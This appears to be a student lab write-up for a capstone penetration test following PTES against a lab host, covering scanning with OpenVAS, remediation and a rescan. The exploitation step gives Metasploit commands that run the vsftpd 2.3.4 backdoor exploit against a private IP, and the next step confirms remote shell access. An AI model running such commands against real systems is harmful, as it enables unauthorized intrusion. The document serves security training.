
---

#  LAB 6 – Capstone VAPT Engagement  
```md
# Lab 6 – Capstone VAPT Engagement Workflow

## Objective
To conduct a full PTES-based Vulnerability Assessment and Penetration Test.

## Tools Used
- Metasploit
- OpenVAS
- Burp Suite
- Kali Linux

## Step-by-Step Workflow

### Step 1: Planning & Scoping
- Define engagement scope
- Identify target systems

### Step 2: Vulnerability Scanning
```bash
openvas-start

### Step 3: Exploitation
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.102
run

### Step 4: Validation

Confirm remote shell access.

### Step 5: Remediation

Patch vulnerable services

Apply least privilege principles

### Step 6: Rescan

Perform OpenVAS rescan to validate fixes.

## Outcome

End-to-end PTES engagement successfully completed.
